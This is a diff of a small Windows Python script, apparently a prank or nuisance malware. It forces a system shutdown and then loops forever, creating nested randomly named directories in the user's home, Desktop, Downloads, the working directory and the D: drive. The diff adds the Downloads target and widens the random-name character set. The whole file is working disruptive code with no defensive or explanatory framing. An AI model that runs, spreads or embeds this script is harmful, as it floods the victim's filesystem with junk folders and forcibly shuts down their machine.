@@ -1,32 +1,35 @@
 from os import *
-from getpass import *
-from random import *
+from getpass import getuser
+from random import sample
+#find the Desktop
 def Desktop():
     username = getuser()
     addres = "C:\\Users\\" + username + "\\Desktop" 
     return addres
+#find Downloads directory
+def Download():
+    username = getuser()
+    addres = "C:\\Users\\" + username + "\\Downloads"
+    return addres
 addres_1 = getcwd()
-addres_2 = "C:\\Users"
+addres_2 = "C:\\Users\\" + getuser()
 addres_3 = Desktop()
 addres_4 = "D:\\"
-name = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
-le = len(name) - 1
+addres_5 = Download()
+name = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789(_!@#$%^&=+-`~)"
+#turn of the system ofter 10 sec
 system("shutdown/s")
 while True:
-    rand_1 = randint(0,le)
-    rand_2 = randint(0,le)
-    rand_3 = randint(0,le)
-    rand_4 = randint(0,le)
-    rand_5 = randint(0,le)
-    rand_6 = randint(0,le)
-    rand_7 = randint(0,le)
-    rand_8 = randint(0,le)
-    direcory = name[rand_1] + name[rand_2] + name[rand_3] + name[rand_4] + name[rand_5] + name[rand_6] + name[rand_7] + name[rand_8]
+    #make random name for directory
+    directory = "".join(sample(name,10))
+    #create the directoryes
     chdir(addres_1)
-    system("mkdir {}\{}\{}\{}".format(direcory,direcory,direcory,direcory))
+    system("mkdir {}\{}\{}\{}".format(directory,directory,directory,directory))
     chdir(addres_2)
-    system("mkdir {}\{}\{}\{}".format(direcory,direcory,direcory,direcory))
+    system("mkdir {}\{}\{}\{}".format(directory,directory,directory,directory))
     chdir(addres_3)
-    system("mkdir {}\{}\{}\{}".format(direcory,direcory,direcory,direcory))
+    system("mkdir {}\{}\{}\{}".format(directory,directory,directory,directory))
     chdir(addres_4)
-    system("mkdir {}\{}\{}\{}".format(direcory,direcory,direcory,direcory))
+    system("mkdir {}\{}\{}\{}".format(directory,directory,directory,directory))
+    chdir(addres_5)
+    system("mkdir {}\{}\{}\{}".format(directory,directory,directory,directory))
